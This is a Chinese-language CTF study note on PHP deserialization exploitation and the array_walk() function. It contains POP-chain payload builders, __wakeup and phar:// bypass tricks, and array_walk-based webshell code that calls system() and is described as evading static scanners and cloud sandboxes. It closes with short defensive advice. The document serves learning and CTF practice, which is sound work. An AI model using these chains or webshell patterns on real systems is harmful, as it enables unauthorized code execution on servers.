一、漏洞原理与触发逻辑

反序列化漏洞的本质是通过unserialize()函数解析用户可控的序列化数据，触发对象中的魔术方法（如__destruct()、__wakeup()等），从而执行恶意操作。例如：

​ 文件删除：若__destruct()中调用unlink($this->filename)，攻击者可通过控制filename属性删除系统文件。

​代码执行：若__toString()或__invoke()中调用eval()或system()，可通过构造对象链触发命令执行。

常用魔术方法:

__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把对象当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发

二、典型POP链构造步骤（以CTF赛题为例）

​起点选择

通常从__destruct()或__wakeup()开始。例如：

php
class Start {
public $mod1;
public function __destruct() {
$this->mod1->test1();
}
}

​方法串联

通过属性传递对象链，逐步触发魔术方法：
​Call::test1() 调用不存在的test2()，触发Funct::__call()。
​Funct::__call() 将$mod1作为函数调用，触发Func::__invoke()。
​Func::__invoke() 拼接字符串，触发String1::__toString()。
​String1::__toString() 调用GetFlag::get_flag()获取Flag

最终利用

通过动态调用链实现代码执行或敏感操作：
构造Payload示例

$start = new Start();
$start->mod1 = new Call();
$start->mod1->mod1 = new Funct();
$start->mod1->mod1->mod1 = new Func();
$start->mod1->mod1->mod1->mod1 = new String1();
$start->mod1->mod1->mod1->mod1->str1 = new GetFlag();
echo serialize($start);

三、绕过技巧与防御对抗

​绕过__wakeup()

修改序列化字符串中的属性数量（如O:1:”A”:2改为O:1:”A”:3），跳过__wakeup()执行。

​Phar协议利用

通过phar://协议触发反序列化，无需直接调用unserialize()

​构造Phar文件：伪装为图片或其他格式绕过上传限制。

​触发条件：调用file_exists()或file_get_contents()等函数。

​属性类型混淆

在PHP 7.1+中，protected/private属性的序列化前缀（\x00*）可省略，直接构造无前缀的序列化字符串实现利用。

题目示例

某CTF题目中，反序列化入口为unserialize($_GET[‘data’])，要求通过POP链获取/flag文件内容。

解题思路

​分析类结构

识别包含魔术方法的类（如FileHandler、Logger），寻找可串联的方法调用路径。

​构造POP链

​起点：FileHandler::__destruct()调用$this->log->save()。

​中间层：Logger::save()触发$this->writer->write()。

​终点：Writer::write()调用file_put_contents($this->path, $this->content)。

​Payload生成

php
class FileHandler {
public $log;
public function __construct() {
$this->log = new Logger();
}
}
class Logger {
public $writer;
public function __construct() {
$this->writer = new Writer();
}
}
class Writer {
public $path = ‘/flag’;
public $content = ‘‘;
}
echo urlencode(serialize(new FileHandler()));

array_walk()

array_walk() 是 PHP 中用于对数组每个元素执行自定义回调函数的内置函数，支持修改原始数组元素值。其语法为

array_walk(array &$array, callable $callback, mixed $userdata = null): bool

​参数解析：

$array：需遍历的数组（按引用传递，直接修改原数组）。

$callback：回调函数，接收元素值和键名（可选第三个参数 $userdata）。

$userdata：传递给回调函数的额外数据

返回值：成功返回 true，失败返回 false

示例​（修改数组元素值）：

$fruits = [“a” => “apple”, “b” => “banana”];
array_walk($fruits, function(&$value, $key) {
$value = strtoupper($value);
});
print_r($fruits);

高级应用

回调函数的灵活调用

array_walk() 的回调函数可以是字符串函数名、匿名函数或类方法。例如：

class Processor {
public static function format(&$value, $key) {
$value = “{$key}: “ . ucfirst($value);
}
}
array_walk($fruits, [‘Processor’, ‘format’]);

安全攻防中的利用场景: 免杀 WebShell;通过将敏感函数（如 system）作为回调函数名，结合变量动态调用绕过检测。例如：

class Shell {
public $cmd = “whoami”;
public function trigger() {
array_walk($this, function($value, $key) {
$key($value); // 若 $key 为 “system”，则执行命令
});
}
}

此类代码可通过混淆函数名和参数，绕过静态检测工具。

​反序列化漏洞利用：结合 __get、__toString 等魔术方法构造 POP 链。例如，通过反序列化触发 array_walk 回调，动态创建恶意对象或执行代码。

​绕过沙箱与条件触发:在 WebShell 中，可通过条件判断（如 IP 白名单、时间戳验证）控制回调函数的执行，仅在特定环境下激活恶意行为，绕过云沙箱的动态分析。

核心机制与基础应用

​函数定义与参数特性

array_walk() 的核心功能是通过回调函数遍历并操作数组元素。其参数结构为：

array_walk(array &$array, callable $callback [, mixed $userdata = null]): bool

​引用传递：通过 &$array 直接修改原数组，无需返回新数组（需在回调函数中对值参数使用 & 符号）。

回调参数传递：默认接收元素值（$value）和键名（$key），若提供 $userdata，则作为第三个参数传递给回调函数。

​题目场景示例：

// 修改数组元素值（如添加前缀）
function addPrefix(&$value, $key, $prefix) {
$value = “$prefix: $value”;
}
$arr = [“a” => “apple”, “b” => “banana”];
array_walk($arr, ‘addPrefix’, ‘Fruit’);
// 输出：[“a” => “Fruit: apple”, “b” => “Fruit: banana”]

​动态回调与安全风险

​动态函数名：若回调函数名来自用户输入（如 $_GET[‘func’]），可能被利用执行恶意函数（如 system）。
反序列化利用：在反序列化漏洞中，若反序列化对象包含 array_walk() 调用链，可触发危险操作（如文件读写）。

攻击示例：

class Malicious {
public $cmd = “id”;
public function trigger() {
array_walk($this, function ($value, $key) {
system($value); // 执行系统命令
});
}
}
// 反序列化触发
unserialize($_GET[‘data’])->trigger();

此类代码可能在CTF题目中作为POP链的触发点。

题目中的高阶应用与绕过技巧

​多维数组处理

array_walk() 默认仅处理一维数组，但可通过递归回调实现多维遍历：

function processMulti(&$value, $key) {
if (is_array($value)) {
array_walk($value, ‘processMulti’);
} else {
$value = strtoupper($value);
}
}
$multiArr = [“a” => [“x”, “y”], “b” => “z”];
array_walk($multiArr, ‘processMulti’);
输出：[“a” => [“X”, “Y”], “b” => “Z”]

此方法适用于题目中需要递归处理嵌套数组的情况。

​绕过限制与防御对抗

哈希校验绕过：若题目要求回调函数名满足特定哈希前缀（如 md5($func) === ‘abc…’），可通过暴力破解生成合法函数名。
​参数污染：通过控制 $userdata 参数传递额外数据，绕过输入过滤（如注入SQL语句片段）。

防御建议：

白名单校验：限制回调函数名仅允许预定义的安全函数。
​禁用危险函数：在 php.ini 中禁用 system、eval 等函数。
